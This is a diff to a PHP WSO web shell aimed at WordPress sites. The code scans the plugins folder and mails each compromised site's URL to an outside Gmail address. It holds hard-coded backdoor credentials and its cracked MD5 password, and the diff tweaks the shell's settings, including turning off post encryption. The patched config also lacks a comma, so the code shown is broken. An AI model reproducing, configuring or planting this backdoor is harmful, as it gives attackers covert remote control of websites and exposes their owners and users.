@@ -1,5 +1,4 @@
 <?php
-error_reporting(0);
 $dpath = isset($_SERVER["DOMAIN_PATH"]) ? $_SERVER["DOMAIN_PATH"] : $_SERVER["DOCUMENT_ROOT"];
 $d = $dpath . '/wp-content/plugins/';
 $f = array(
@@ -33,9 +32,6 @@ foreach ($f as $w) {
     }
 };
 
-
-
-
 if (!isset($_SESSION['trimite'])) {
     $url = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
     @mail("malaysia.sender@gmail.com", "WSO Shell", $url);
@@ -62,9 +58,8 @@ $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'hackerman',
     'password' => '9f7b0c36272cf9b3608ae0a33b1a4ade',//md5(hackerman1337)
     'safe_mode' => '0',
-    'login_page' => 'gui',
-    'show_icons' => '0',
-    'post_encryption' => true,
+    'show_icons' => '1',
+    'post_encryption' => false
     'cgi_api' => false,
 );
 
